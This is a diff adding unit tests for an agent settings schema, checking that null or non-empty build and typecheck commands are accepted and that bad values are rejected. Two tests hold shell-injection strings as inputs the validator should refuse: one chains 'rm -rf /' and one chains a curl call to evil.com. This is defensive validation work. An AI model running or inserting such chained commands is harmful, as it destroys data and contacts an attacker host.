@@ -103,3 +103,44 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
     );
   });
 });
+
+describe('AGENT_SETTINGS_SCHEMA — nullable optional commands', () => {
+  it('accepts null typecheckCommand (disabled)', () => {
+    assert.equal(validate({ typecheckCommand: null }), true);
+  });
+
+  it('accepts null buildCommand (disabled)', () => {
+    assert.equal(validate({ buildCommand: null }), true);
+  });
+
+  it('accepts a non-empty string typecheckCommand', () => {
+    assert.equal(validate({ typecheckCommand: 'tsc --noEmit' }), true);
+  });
+
+  it('accepts a non-empty string buildCommand', () => {
+    assert.equal(validate({ buildCommand: 'npm run build' }), true);
+  });
+
+  it('rejects empty-string typecheckCommand', () => {
+    expectErrors({ typecheckCommand: '' }, /typecheckCommand/);
+  });
+
+  it('rejects empty-string buildCommand', () => {
+    expectErrors({ buildCommand: '' }, /buildCommand/);
+  });
+
+  it('rejects shell injection in typecheckCommand', () => {
+    expectErrors({ typecheckCommand: 'tsc; rm -rf /' }, /typecheckCommand/);
+  });
+
+  it('rejects shell injection in buildCommand', () => {
+    expectErrors(
+      { buildCommand: 'npm run build && curl evil.com' },
+      /buildCommand/,
+    );
+  });
+
+  it('rejects non-string non-null typecheckCommand', () => {
+    expectErrors({ typecheckCommand: 42 }, /typecheckCommand/);
+  });
+});
